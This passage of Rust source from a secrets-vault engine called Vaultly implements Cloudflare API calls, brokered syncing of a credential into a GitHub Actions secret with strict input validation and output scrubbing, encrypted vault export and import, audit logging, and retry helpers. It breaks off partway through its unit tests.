            .map_err(|e| VaultError::Policy(format!("Cloudflare request failed: {}", e)))?;
        let status = res.status().as_u16();
        let data: Value = res
            .json()
            .await
            .map_err(|e| VaultError::Policy(format!("Invalid response: {}", e)))?;

        // Scrub credentials from response (in case they're echoed back)
        let scrubbed = scrub_output(
            &serde_json::to_string_pretty(&data).unwrap_or_default(),
            &Self::cf_secret_values(&secrets),
        );
        let data: Value = serde_json::from_str(&scrubbed).unwrap_or(data);

        Ok(ApiResult { status, data })
    }

    /// Resolve the Cloudflare account ID for a vault (account-level endpoints).
    pub fn cf_account_id(&mut self, vault_name: &str) -> Result<String> {
        let secrets = self.read_secrets(vault_name)?;
        secrets
            .get("CLOUDFLARE_ACCOUNT_ID")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
            .ok_or_else(|| {
                VaultError::MissingAccountId(
                    vault_name.to_string(),
                    secrets.keys().cloned().collect::<Vec<_>>().join(", "),
                )
            })
    }

    /// Perform a Cloudflare API call scoped to the vault's account ID.
    /// Resolves CLOUDFLARE_ACCOUNT_ID and prefixes the path with /accounts/{id}.
    pub async fn cloudflare_account_api(
        &mut self,
        vault_name: &str,
        method: &str,
        api_path: &str,
        body: Option<Value>,
        ctx: Option<&CallerContext>,
    ) -> Result<ApiResult> {
        let account_id = self.cf_account_id(vault_name)?;
        let full = format!("/accounts/{}{}", urlencode(&account_id), api_path);
        self.cloudflare_api(vault_name, method, &full, body, ctx)
            .await
    }

    /// Cloudflare API call with a raw text body and raw text response
    /// (used by R2 object and KV key writes/reads where the payload is not JSON).
    pub async fn cloudflare_raw(
        &mut self,
        vault_name: &str,
        method: &str,
        api_path: &str,
        body: Option<&str>,
        ctx: Option<&CallerContext>,
    ) -> Result<ApiResult> {
        self.op(ctx, Operation::CfApi, vault_name)?;
        let secrets = self.read_secrets(vault_name)?;
        let headers = Self::build_cf_headers(vault_name, &secrets)?;
        self.audit(
            "CF_API",
            &format!("{} {} (vault={})", method, api_path, vault_name),
            ctx,
        );
        let url = format!("{}{}", self.cf_base, api_path);
        let client = reqwest::Client::new();
        let method = reqwest::Method::from_bytes(method.as_bytes())
            .map_err(|e| VaultError::Policy(e.to_string()))?;
        let mut req = client.request(method, &url).headers(headers);
        if let Some(b) = body {
            req = req.body(b.to_string());
        }
        let res = send_with_retry(req)
            .await
            .map_err(|e| VaultError::Policy(format!("Cloudflare request failed: {}", e)))?;
        let status = res.status().as_u16();
        let text = res
            .text()
            .await
            .map_err(|e| VaultError::Policy(format!("Invalid response: {}", e)))?;
        let scrubbed = scrub_output(&text, &Self::cf_secret_values(&secrets));
        let data: Value = serde_json::from_str(&scrubbed)
            .unwrap_or_else(|_| serde_json::json!({ "raw": scrubbed }));
        Ok(ApiResult { status, data })
    }

    /// Delete a DNS record from a zone (agent-safe — never returns values).
    pub async fn dns_delete(
        &mut self,
        vault_name: &str,
        zone_id: &str,
        record_id: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<ApiResult> {
        self.cloudflare_api(
            vault_name,
            "DELETE",
            &format!("/zones/{}/dns_records/{}", zone_id, record_id),
            None,
            ctx,
        )
        .await
    }

    // ─── Workers List ─────────────────────────────────────

    pub async fn list_workers(
        &mut self,
        vault_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<(String, Vec<String>)> {
        self.op(ctx, Operation::CfApi, vault_name)?;
        let secrets = self.read_secrets(vault_name)?;
        let headers = Self::build_cf_headers(vault_name, &secrets)?;
        let account_id = secrets
            .get("CLOUDFLARE_ACCOUNT_ID")
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                VaultError::MissingAccountId(
                    vault_name.to_string(),
                    secrets.keys().cloned().collect::<Vec<_>>().join(", "),
                )
            })?
            .to_string();

        self.audit(
            "CF_WORKERS",
            &format!("list workers (vault={})", vault_name),
            ctx,
        );

        let url = format!(
            "{}/accounts/{}/workers/scripts",
            self.cf_base,
            urlencode(&account_id)
        );
        let client = reqwest::Client::new();
        let res = send_with_retry(client.get(&url).headers(headers))
            .await
            .map_err(|e| VaultError::Policy(e.to_string()))?;
        let data: Value = res
            .json()
            .await
            .map_err(|e| VaultError::Policy(e.to_string()))?;
        let workers: Vec<String> = data
            .get("result")
            .and_then(|r| r.as_array())
            .map(|arr| {
                arr.iter()
                    .filter_map(|w| w.get("id").and_then(|i| i.as_str()))
                    .map(|s| s.to_string())
                    .collect()
            })
            .unwrap_or_default();

        Ok((account_id, workers))
    }

    /// List the deployment versions of a Worker script (agent-safe — no values).
    pub async fn list_worker_versions(
        &mut self,
        vault_name: &str,
        script_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<Vec<Value>> {
        self.op(ctx, Operation::CfApi, vault_name)?;
        let secrets = self.read_secrets(vault_name)?;
        let headers = Self::build_cf_headers(vault_name, &secrets)?;
        let account_id = secrets
            .get("CLOUDFLARE_ACCOUNT_ID")
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                VaultError::MissingAccountId(
                    vault_name.to_string(),
                    secrets.keys().cloned().collect::<Vec<_>>().join(", "),
                )
            })?
            .to_string();

        self.audit(
            "CF_WORKERS",
            &format!("list versions of '{}' (vault={})", script_name, vault_name),
            ctx,
        );

        let url = format!(
            "{}/accounts/{}/workers/scripts/{}/versions?per_page=50",
            self.cf_base,
            urlencode(&account_id),
            urlencode(script_name)
        );
        let client = reqwest::Client::new();
        let res = send_with_retry(client.get(&url).headers(headers))
            .await
            .map_err(|e| VaultError::Policy(e.to_string()))?;
        let data: Value = res
            .json()
            .await
            .map_err(|e| VaultError::Policy(e.to_string()))?;
        let versions: Vec<Value> = data
            .get("result")
            .and_then(|r| r.as_array())
            .cloned()
            .unwrap_or_default();
        Ok(versions)
    }

    // ─── Storage List (D1 / R2 / KV) ──────────────────────
    //
    // Read-only discovery, mirroring `list_workers`: names and ids only, no
    // stored values, no mutations. The account is always the one bound to the
    // selected vault, so an agent can never point these at another account.

    /// D1 databases in the vault's account.
    pub async fn list_d1_databases(
        &mut self,
        vault_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<Vec<StorageResource>> {
        self.list_account_storage(vault_name, "D1", "/d1/database", ctx)
            .await
    }

    /// R2 buckets in the vault's account.
    pub async fn list_r2_buckets(
        &mut self,
        vault_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<Vec<StorageResource>> {
        self.list_account_storage(vault_name, "R2", "/r2/buckets", ctx)
            .await
    }

    /// Workers KV namespaces in the vault's account.
    pub async fn list_kv_namespaces(
        &mut self,
        vault_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<Vec<StorageResource>> {
        self.list_account_storage(vault_name, "KV", "/storage/kv/namespaces", ctx)
            .await
    }

    /// Shared account-scoped inventory call. `label` is only used for audit and
    /// error text; `path` is a fixed literal from the callers above, never
    /// agent input.
    async fn list_account_storage(
        &mut self,
        vault_name: &str,
        label: &str,
        path: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<Vec<StorageResource>> {
        self.op(ctx, Operation::CfApi, vault_name)?;
        self.audit(
            &format!("CF_{}", label),
            &format!("list {label} resources (vault={})", vault_name),
            ctx,
        );

        let r = self
            .cloudflare_account_api(vault_name, "GET", path, None, ctx)
            .await?;
        if !(200..300).contains(&r.status) {
            return Err(VaultError::CloudflareResponse(format!(
                "{} discovery failed: {}",
                label,
                Self::cf_failure_detail(path, r.status, &r.data)
            )));
        }
        Ok(Self::storage_resources(&r.data))
    }

    /// Extract `name`/`id` pairs from a Cloudflare inventory response. Accepts
    /// the bare-array shape and the `{"result": {"<key>": [...]}}` object shape
    /// (R2 answers with `buckets`), and falls back to the array's first string
    /// field for the id, which is how KV namespaces and D1 databases differ.
    fn storage_resources(data: &Value) -> Vec<StorageResource> {
        let items = match data.get("result") {
            Some(Value::Array(arr)) => arr.clone(),
            Some(obj) => ["databases", "buckets", "namespaces", "items"]
                .iter()
                .find_map(|key| obj.get(*key).and_then(Value::as_array).cloned())
                .unwrap_or_default(),
            None => Vec::new(),
        };
        items
            .iter()
            .filter_map(|item| {
                let name = item
                    .get("name")
                    .or_else(|| item.get("title"))
                    .and_then(Value::as_str)?
                    .to_string();
                let id = ["uuid", "id", "namespace_id"]
                    .iter()
                    .find_map(|key| item.get(*key).and_then(Value::as_str))
                    .unwrap_or_default()
                    .to_string();
                Some(StorageResource { name, id })
            })
            .collect()
    }

    // ─── Worker Secrets ───────────────────────────────────

    /// Request body for `PUT .../workers/scripts/{script}/secrets`.
    ///
    /// Cloudflare requires an explicit `type` on a secret; omitting it fails with
    /// `Secret '<name>' has unsupported type ''`. `secret_text` is the plain-string
    /// type, which is what any CLI-supplied secret is. Kept separate from the
    /// request so the shape is unit-testable without a network.
    pub fn cf_secret_body(name: &str, value: &str) -> Value {
        serde_json::json!({
            "name": name,
            "text": value,
            "type": "secret_text",
        })
    }

    pub async fn worker_secrets(
        &mut self,
        vault_name: &str,
        script_name: &str,
        action: &str,
        name: Option<&str>,
        value: Option<&str>,
        ctx: Option<&CallerContext>,
    ) -> Result<ApiResult> {
        self.op(ctx, Operation::CfApi, vault_name)?;

        if action != "list" && name.is_none() {
            return Err(VaultError::RequiredField("name".into(), action.into()));
        }
        if action == "set" && value.is_none() {
            return Err(VaultError::RequiredField("value".into(), "set".into()));
        }

        let secrets = self.read_secrets(vault_name)?;
        let headers = Self::build_cf_headers(vault_name, &secrets)?;
        let account_id = secrets
            .get("CLOUDFLARE_ACCOUNT_ID")
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                VaultError::MissingAccountId(
                    vault_name.to_string(),
                    secrets.keys().cloned().collect::<Vec<_>>().join(", "),
                )
            })?
            .to_string();

        self.audit(
            "CF_SECRETS",
            &format!(
                "{} {}{} (vault={})",
                action,
                script_name,
                name.map(|n| format!("/{}", n)).unwrap_or_default(),
                vault_name
            ),
            ctx,
        );

        let base = format!(
            "{}/accounts/{}/workers/scripts/{}/secrets",
            self.cf_base,
            urlencode(&account_id),
            urlencode(script_name)
        );
        let client = reqwest::Client::new();

        let res = match action {
            "list" => send_with_retry(client.get(&base).headers(headers)).await?,
            "set" => {
                let name = name.ok_or_else(|| {
                    VaultError::RequiredField("name".into(), script_name.to_string())
                })?;
                let value = value.ok_or_else(|| {
                    VaultError::RequiredField("value".into(), script_name.to_string())
                })?;
                let body = Self::cf_secret_body(name, value);
                send_with_retry(client.put(&base).headers(headers).json(&body)).await?
            }
            "delete" => {
                let name = name.ok_or_else(|| {
                    VaultError::RequiredField("name".into(), script_name.to_string())
                })?;
                let url = format!("{}/{}", base, urlencode(name));
                send_with_retry(client.delete(&url).headers(headers)).await?
            }
            other => return Err(VaultError::UnknownSecretAction(other.to_string())),
        };

        let status = res.status().as_u16();
        let data: Value = res
            .json()
            .await
            .map_err(|e| VaultError::Policy(e.to_string()))?;
        let scrubbed = scrub_output(
            &serde_json::to_string_pretty(&data).unwrap_or_default(),
            &Self::cf_secret_values(&secrets),
        );
        let data: Value = serde_json::from_str(&scrubbed).unwrap_or(data);

        Ok(ApiResult { status, data })
    }

    // ─── Health Check ─────────────────────────────────────

    /// Probe one read-only endpoint and describe the outcome for a health
    /// message: `(healthy, detail)`, where `detail` is the probe path on success
    /// and Cloudflare's own error text on failure. Never returns credential
    /// material, and never echoes response bodies (the account email is a
    /// scrubbed credential, so it would only ever come back redacted).
    async fn cf_probe(
        &mut self,
        vault_name: &str,
        path: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<(bool, String)> {
        match self
            .cloudflare_api(vault_name, "GET", path, None, ctx)
            .await
        {
            Ok(r) => {
                if !(200..300).contains(&r.status) {
                    return Ok((false, Self::cf_failure_detail(path, r.status, &r.data)));
                }
                // A user-scoped token verify can answer 200 while reporting a
                // dead token; treat any non-active status as a failure.
                if let Some(status) = r
                    .data
                    .get("result")
                    .and_then(|x| x.get("status"))
                    .and_then(|s| s.as_str())
                {
                    if status != "active" {
                        return Ok((false, format!("Token status: {}", status)));
                    }
                }
                Ok((true, format!("verified via GET {}", path)))
            }
            Err(e) => Ok((false, format!("GET {} failed: {}", path, e))),
        }
    }

    /// One-line, value-free description of a Cloudflare failure.
    fn cf_failure_detail(path: &str, status: u16, data: &Value) -> String {
        let msgs: Vec<String> = data
            .get("errors")
            .and_then(|e| e.as_array())
            .map(|arr| {
                arr.iter()
                    .filter_map(|e| e.get("message").and_then(|m| m.as_str()))
                    .map(|s| s.to_string())
                    .collect()
            })
            .unwrap_or_default();
        if msgs.is_empty() {
            format!("GET {} failed with HTTP {}", path, status)
        } else {
            format!(
                "GET {} failed with HTTP {}: {}",
                path,
                status,
                msgs.join(", ")
            )
        }
    }

    /// Verify one Cloudflare credential set without exposing it.
    ///
    /// Probes are tried in order of how much they prove about the operations
    /// Vaultly actually performs, and the first success wins. The user-level
    /// endpoint is probed LAST on purpose: account-scoped API tokens are
    /// rejected there with HTTP 401 even when every account operation works,
    /// so trusting it alone reported healthy credentials as broken.
    pub async fn health_check(
        &mut self,
        vault_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<(bool, String)> {
        self.op(ctx, Operation::CfApi, vault_name)?;
        let secrets = self.read_secrets(vault_name)?;
        let token = secrets.get("CLOUDFLARE_API_TOKEN").and_then(|v| v.as_str());
        let email = secrets.get("CLOUDFLARE_EMAIL").and_then(|v| v.as_str());
        let api_key = secrets.get("CLOUDFLARE_API_KEY").and_then(|v| v.as_str());
        let account_id = secrets
            .get("CLOUDFLARE_ACCOUNT_ID")
            .and_then(|v| v.as_str());

        if token.is_none() && !(email.is_some() && api_key.is_some()) {
            return Ok((
                false,
                format!(
                    "No Cloudflare credentials in '{}'. Need CLOUDFLARE_API_TOKEN or CLOUDFLARE_EMAIL + CLOUDFLARE_API_KEY.",
                    vault_name
                ),
            ));
        }

        let mut probes: Vec<String> = Vec::new();
        if let Some(id) = account_id {
            probes.push(format!("/accounts/{}", urlencode(id)));
        }
        probes.push("/zones?per_page=1".to_string());
        probes.push(if token.is_some() {
            "/user/tokens/verify".to_string()
        } else {
            "/user".to_string()
        });

        let mut failures: Vec<String> = Vec::new();
        for path in probes {
            let (ok, detail) = self.cf_probe(vault_name, &path, ctx).await?;
            if ok {
                return Ok((true, format!("Credential is valid ✓ ({})", detail)));
            }
            failures.push(detail);
        }
        Ok((
            false,
            format!("Credential is not usable: {}", failures.join("; ")),
        ))
    }

    // ─── GitHub secret sync ─────────────────────────────
    //
    // Brokered copy of one vault credential into a GitHub Actions repository
    // secret. The value travels vault -> `gh` child stdin only; it is never
    // returned to the caller, logged, or placed on a command line. Names are
    // strictly validated so agent-controlled inputs cannot reshape the fixed
    // `gh secret set` invocation. `gh` authenticates with the human's existing
    // login (keychain/credential helper), so no GitHub token is stored in any
    // vault for this operation.

    /// Validate `owner/repo` without accepting flags, paths, or URLs.
    fn validate_github_repo(repo: &str) -> Result<()> {
        let valid_part = |part: &str| {
            !part.is_empty()
                && part.len() <= 100
                && part
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
        };
        match repo.split_once('/') {
            Some((owner, name)) if valid_part(owner) && valid_part(name) => Ok(()),
            _ => Err(VaultError::Policy(
                "GitHub repo must look like 'owner/name' (letters, numbers, '-', '_', '.')".into(),
            )),
        }
    }

    /// Validate a GitHub Actions secret name (uppercase, digits, underscore).
    fn validate_github_secret_name(name: &str) -> Result<()> {
        if name.len() <= 64
            && !name.is_empty()
            && name
                .chars()
                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
        {
            Ok(())
        } else {
            Err(VaultError::Policy(
                "GitHub secret name must be 1-64 chars of A-Z, 0-9, '_'".into(),
            ))
        }
    }

    /// Validate a GitHub environment name (letters, numbers, '-', '_').
    fn validate_github_env(env: &str) -> Result<()> {
        if !env.is_empty()
            && env.len() <= 100
            && env
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
        {
            Ok(())
        } else {
            Err(VaultError::Policy(
                "GitHub environment must be 1-100 chars of letters, numbers, '-', '_'".into(),
            ))
        }
    }

    /// Copy one credential from a vault into a GitHub Actions repository
    /// secret. Returns names-only status; the value is never exposed.
    pub async fn sync_github_secret(
        &mut self,
        source_vault: &str,
        source_key: &str,
        repo: &str,
        secret_name: &str,
        env: Option<&str>,
        ctx: Option<&CallerContext>,
    ) -> Result<String> {
        self.op(ctx, Operation::GithubSync, source_vault)?;
        Self::validate_github_repo(repo)?;
        Self::validate_github_secret_name(secret_name)?;
        // Environment secrets shadow repo secrets for jobs pinned to that
        // environment; syncing the repo copy alone leaves CI broken.
        if let Some(env) = env {
            Self::validate_github_env(env)?;
        }
        if source_key.trim().is_empty() || source_key.chars().any(|c| c.is_control()) {
            return Err(VaultError::Policy("source key name is invalid".into()));
        }
        let key = self.require_unlocked_copy()?;
        if self
            .store
            .get_secret_meta(source_vault, &key)?
            .iter()
            .any(|(name, meta)| name == source_key && meta.expired)
        {
            return Err(VaultError::Policy(
                "The source credential has expired".into(),
            ));
        }
        let secrets = self.read_secrets(source_vault)?;
        let value = secrets
            .get(source_key)
            .and_then(|v| v.as_str())
            .ok_or_else(|| VaultError::SecretNotFound(source_key.into(), source_vault.into()))?;
        if value.is_empty() {
            return Err(VaultError::Policy("source credential is empty".into()));
        }
        // Borrow as &str so the scrubber never clones the value.
        let secret_values = [value];
        self.audit(
            "GITHUB_SYNC",
            &format!(
                "vault={} key={} repo={} env={} secret={}",
                source_vault,
                source_key,
                repo,
                env.unwrap_or("-"),
                secret_name
            ),
            ctx,
        );
        // Fixed script: names travel via env (no shell parsing of agent
        // input), the value travels via a dedicated env var into `gh` stdin.
        // Nothing agent-controlled appears on the command line. The optional
        // environment flag is interpolated only after strict validation
        // (no quotes, spaces, or shell metacharacters possible).
        let env_flag = env.map(|e| format!(" --env \"{e}\"")).unwrap_or_default();
        let script = format!(
            "gh secret set \"$VAULTLY_SYNC_SECRET\" --repo \"$VAULTLY_SYNC_REPO\"{env_flag} --body \"$VAULTLY_SYNC_BODY\""
        );
        let mut child_env = vec![
            ("VAULTLY_SYNC_SECRET".to_string(), secret_name.to_string()),
            ("VAULTLY_SYNC_REPO".to_string(), repo.to_string()),
            ("VAULTLY_SYNC_BODY".to_string(), value.to_string()),
        ];
        // `gh` authenticates via the human's config file (~/.config/gh); the
        // spawn environment is otherwise cleared, so HOME must be restored
        // for `gh` to find it. HOME itself is not secret.
        if let Some(home) = std::env::var_os("HOME") {
            child_env.push(("HOME".to_string(), home.to_string_lossy().into_owned()));
        }
        let result = self
            .spawn(
                "sh",
                &["-c".to_string(), script.to_string()],
                &child_env,
                None,
                120_000,
            )
            .await
            .map_err(|e| VaultError::Policy(format!("GitHub sync failed to start: {}", e)))?;
        // Scrub before any error text can reach the caller.
        let stdout = scrub_output(&result.stdout, &secret_values);
        let stderr = scrub_output(&result.stderr, &secret_values);
        if stdout != result.stdout || stderr != result.stderr {
            self.audit(
                "SCRUB",
                "Scrubbed secret values from GitHub sync output",
                ctx,
            );
        }
        if result.code != 0 {
            return Err(VaultError::CommandFailed(
                format!(
                    "GitHub secret sync to '{}/{}' (env {})",
                    repo,
                    secret_name,
                    env.unwrap_or("-")
                ),
                result.code,
                failure_output_detail(&stdout, &stderr),
            ));
        }
        Ok(format!(
            "Synced '{}' from vault '{}' to GitHub secret '{}/{}' (env {}, value never shown)",
            source_key,
            source_vault,
            repo,
            secret_name,
            env.unwrap_or("-")
        ))
    }

    // ─── Backup / Restore ─────────────────────────────────

    pub fn get_encrypted_vaults(&self) -> Map<String, Value> {
        self.store.get_encrypted_vaults()
    }

    pub fn restore_encrypted_vaults(&mut self, vaults: &Map<String, Value>) -> Result<usize> {
        let count = self.store.restore_encrypted_vaults(vaults)?;
        self.audit("RESTORE", &format!("{} vaults restored", count), None);
        Ok(count)
    }

    pub fn update_backup_meta(&mut self, worker_url: &str) -> Result<()> {
        self.store.update_backup_meta(worker_url)
    }

    // ─── Encrypted Export / Import ─────────────────────────

    /// Export a vault as an encrypted, portable blob. The blob carries its own
    /// salt and can be imported by any vaultly instance that knows the master
    /// password. `password` is used transiently to derive a fresh key and is
    /// never stored.
    pub fn export_encrypted(
        &mut self,
        vault_name: &str,
        password: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<crate::crypto::EncryptedExport> {
        let key = self.require_unlocked_copy()?;
        let entries = self.store.get_secret_entries(vault_name, &key)?;
        if entries.is_empty() {
            return Err(VaultError::VaultEmpty(vault_name.to_string()));
        }
        let blob = crate::crypto::encrypt_export(&entries, password)?;
        self.audit(
            "EXPORT",
            &format!("{}/{} keys", vault_name, entries.len()),
            ctx,
        );
        Ok(blob)
    }

    /// Import an encrypted export blob into a target vault. The blob is
    /// decrypted with `password` + its embedded salt, then each secret is
    /// re-encrypted and stored under `target_vault`.
    pub fn import_encrypted(
        &mut self,
        blob: &crate::crypto::EncryptedExport,
        password: &str,
        target_vault: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<usize> {
        let entries = crate::crypto::decrypt_export(blob, password)?;
        if entries.is_empty() {
            return Err(VaultError::VaultEmpty("export".into()));
        }
        let vault = if target_vault.is_empty() {
            "imported"
        } else {
            target_vault
        };
        let count = entries.len();
        for (key, entry) in &entries {
            let key_material = self.require_unlocked_copy()?;
            self.store
                .set_secret(vault, key, &entry.value, &key_material)?;
        }
        self.audit(
            "IMPORT_ENCRYPTED",
            &format!("{}/{} keys", vault, count),
            ctx,
        );
        Ok(count)
    }

    // ─── Audit ────────────────────────────────────────────

    pub fn get_audit_log(&self, lines: usize) -> Vec<String> {
        let path = self.store.audit_log_path();
        let Ok(raw) = fs::read_to_string(&path) else {
            return vec![];
        };
        let entries: Vec<&str> = raw.lines().collect();
        entries
            .iter()
            .rev()
            .take(lines)
            .rev()
            .map(|s| s.to_string())
            .collect()
    }

    pub fn audit(&mut self, action: &str, detail: &str, ctx: Option<&CallerContext>) {
        let caller = match ctx {
            Some(c) => match c.caller {
                crate::policy::Caller::Agent => "agent",
                crate::policy::Caller::Human => "human",
            },
            None => "human",
        };
        let entry = AuditEntry {
            ts: chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Millis, true),
            action: action.to_string(),
            detail: detail.to_string(),
            caller: caller.to_string(),
            agent: ctx.and_then(|c| c.agent_name.clone()),
        };
        // Serialize through AuditEntry, then append through the same chained,
        // rotation-aware writer used by the store so agent audit lines are
        // covered by the hash chain too.
        let entry_val = serde_json::to_value(&entry).unwrap_or(serde_json::Value::Null);
        if let Err(e) = self.store.append_audit_line(&entry_val) {
            eprintln!("⚠ Vaultly: failed to write audit entry: {e}");
        }
    }
}

fn same_target_identity(left: &DeploymentTarget, right: &DeploymentTarget) -> bool {
    left.provider == right.provider
        && left.vault == right.vault
        && left.account_id == right.account_id
        && left.project == right.project
        && left.project_dir == right.project_dir
        && left.build_command == right.build_command
        && left.output_dir == right.output_dir
        && left.branch == right.branch
        && left.worker_package_deploy == right.worker_package_deploy
}

async fn finish_output(task: &mut tokio::task::JoinHandle<(Vec<u8>, bool)>) -> (Vec<u8>, bool) {
    match tokio::time::timeout(Duration::from_secs(1), &mut *task).await {
        Ok(Ok(output)) => output,
        _ => {
            task.abort();
            (Vec::new(), true)
        }
    }
}

async fn read_capped(stream: &mut (impl AsyncRead + Unpin)) -> (Vec<u8>, bool) {
    let mut buf: Vec<u8> = Vec::with_capacity(64 * 1024);
    let mut chunk = [0u8; 8192];
    let mut truncated = false;
    loop {
        let n = match stream.read(&mut chunk).await {
            Ok(0) => break,
            Ok(n) => n,
            Err(_) => break,
        };
        if buf.len() < MAX_BUFFER {
            let room = MAX_BUFFER - buf.len();
            buf.extend_from_slice(&chunk[..n.min(room)]);
        } else {
            truncated = true;
        }
    }
    (buf, truncated)
}

fn fmt_buf(buf: Vec<u8>, truncated: bool) -> String {
    let mut s = String::from_utf8_lossy(&buf).to_string();
    if truncated {
        s.push_str("\n...(output truncated at 5MB)");
    }
    s
}

/// Number of attempts (including the first) for Cloudflare/network requests
/// before a transient failure is surfaced to the caller.
const CF_MAX_ATTEMPTS: u32 = 3;

fn retry_delay_ms(attempt: u32) -> u64 {
    // Exponential backoff: 200ms, 400ms — capped at 2s.
    (200u64 * (1u64 << attempt.saturating_sub(1))).min(2000)
}

fn is_transient_request_err(e: &reqwest::Error) -> bool {
    e.is_connect() || e.is_timeout() || e.is_body()
}

struct DeployFile {
    relative: String,
    hash: String,
    bytes: Vec<u8>,
}

fn collect_deploy_files(root: &Path) -> Result<Vec<DeployFile>> {
    let mut paths = Vec::new();
    collect_deploy_paths(root, root, &mut paths)?;
    let mut files = Vec::with_capacity(paths.len());
    for (relative, path) in paths {
        let bytes = fs::read(&path)?;
        if bytes.len() > 25 * 1024 * 1024 {
            return Err(VaultError::Policy(format!(
                "Pages asset '{}' exceeds the 25 MiB file limit",
                relative
            )));
        }
        let hash = pages_asset_hash(&relative, &bytes);
        files.push(DeployFile {
            relative,
            hash,
            bytes,
        });
    }
    Ok(files)
}

/// Match Wrangler's Pages Direct Upload asset key algorithm:
/// BLAKE3(base64(file bytes) + file extension), truncated to 32 hex chars.
fn pages_asset_hash(relative: &str, bytes: &[u8]) -> String {
    let encoded = base64::engine::general_purpose::STANDARD.encode(bytes);
    let extension = Path::new(relative)
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or("");
    let mut input = encoded;
    input.push_str(extension);
    hex::encode(blake3::hash(input.as_bytes()).as_bytes())[..32].to_string()
}

fn collect_deploy_paths(
    root: &Path,
    current: &Path,
    out: &mut Vec<(String, PathBuf)>,
) -> Result<()> {
    for entry in fs::read_dir(current)? {
        let entry = entry?;
        let path = entry.path();
        let meta = fs::symlink_metadata(&path)?;
        if meta.file_type().is_symlink() {
            return Err(VaultError::Policy(format!(
                "Pages output contains unsupported symlink '{}'",
                path.display()
            )));
        }
        if meta.is_dir() {
            collect_deploy_paths(root, &path, out)?;
        } else if meta.is_file() {
            let rel = path
                .strip_prefix(root)
                .map_err(|e| VaultError::Policy(e.to_string()))?
                .to_string_lossy()
                .replace(std::path::MAIN_SEPARATOR, "/");
            out.push((rel, path));
        }
    }
    out.sort_by(|a, b| a.0.cmp(&b.0));
    Ok(())
}

fn content_type(path: &str) -> &'static str {
    match Path::new(path)
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
    {
        "html" => "text/html; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "js" | "mjs" => "application/javascript; charset=utf-8",
        "json" | "map" => "application/json; charset=utf-8",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "ico" => "image/x-icon",
        "txt" => "text/plain; charset=utf-8",
        "xml" => "application/xml",
        "woff" => "font/woff",
        "woff2" => "font/woff2",
        "wasm" => "application/wasm",
        _ => "application/octet-stream",
    }
}

/// Send a request with bounded retry + exponential backoff on transient
/// network errors and HTTP 5xx responses. Requests with buffered (JSON)
/// bodies are cloneable, so each attempt re-sends an identical request.
async fn send_with_retry(request: reqwest::RequestBuilder) -> Result<reqwest::Response> {
    let mut attempt: u32 = 0;
    loop {
        attempt += 1;
        let candidate = request.try_clone().ok_or_else(|| {
            VaultError::CloudflareResponse("request body is not retryable".into())
        })?;
        match candidate.send().await {
            Ok(res) if res.status().is_server_error() && attempt < CF_MAX_ATTEMPTS => {
                tokio::time::sleep(std::time::Duration::from_millis(retry_delay_ms(attempt))).await;
            }
            Ok(res) => return Ok(res),
            Err(e) if attempt < CF_MAX_ATTEMPTS && is_transient_request_err(&e) => {
                tokio::time::sleep(std::time::Duration::from_millis(retry_delay_ms(attempt))).await;
            }
            Err(e) => return Err(VaultError::CloudflareRequest(e)),
        }
    }
}

/// Send a non-retryable request exactly once.
///
/// Use this for mutating requests whose body is not cloneable or whose retry
/// could create a duplicate remote resource.
async fn send_once(request: reqwest::RequestBuilder) -> Result<reqwest::Response> {
    request.send().await.map_err(VaultError::CloudflareRequest)
}

/// Return a small, secret-free summary of a Cloudflare API error response.
/// Cloudflare's response envelope is safe to inspect, but the full body should
/// never be forwarded to an agent because providers can add arbitrary fields.
fn cloudflare_response_detail(data: &Value) -> String {
    for key in ["errors", "messages"] {
        let Some(entries) = data.get(key).and_then(Value::as_array) else {
            continue;
        };

        let details: Vec<String> = entries
            .iter()
            .take(3)
            .filter_map(|entry| {
                let message = entry.get("message").and_then(Value::as_str)?;
                let code = entry.get("code").and_then(Value::as_u64);
                let message: String = message.chars().take(240).collect();
                Some(match code {
                    Some(code) => format!("{} ({})", message, code),
                    None => message,
                })
            })
            .collect();

        if !details.is_empty() {
            return details.join("; ");
        }
    }

    "Cloudflare returned no error details".into()
}

pub fn urlencode(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "-_.~".contains(c) {
                c.to_string()
            } else {
                let mut buf = [0u8; 4];
                let bytes = c.encode_utf8(&mut buf).as_bytes();
                bytes.iter().map(|b| format!("%{:02X}", b)).collect()
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    #[test]
    fn cf_secret_body_includes_the_type_cloudflare_requires() {
        // Regression: the body used to be {name, text} with no `type`, and
        // Cloudflare rejected it with "unsupported type ''". A secret set through
        // `vaultly cf secrets --set` could therefore never succeed.
        let body = VaultEngine::cf_secret_body("GITHUB_CLIENT_ID", "Iv1.abc123");
        assert_eq!(body["name"], "GITHUB_CLIENT_ID");
        assert_eq!(body["text"], "Iv1.abc123");
        assert_eq!(
            body["type"], "secret_text",
            "Cloudflare rejects a secret with no type"
        );
    }

    #[test]
    fn cf_secret_body_sends_no_unexpected_fields() {
        let body = VaultEngine::cf_secret_body("K", "v");
        let keys: Vec<&String> = body.as_object().expect("object").keys().collect();
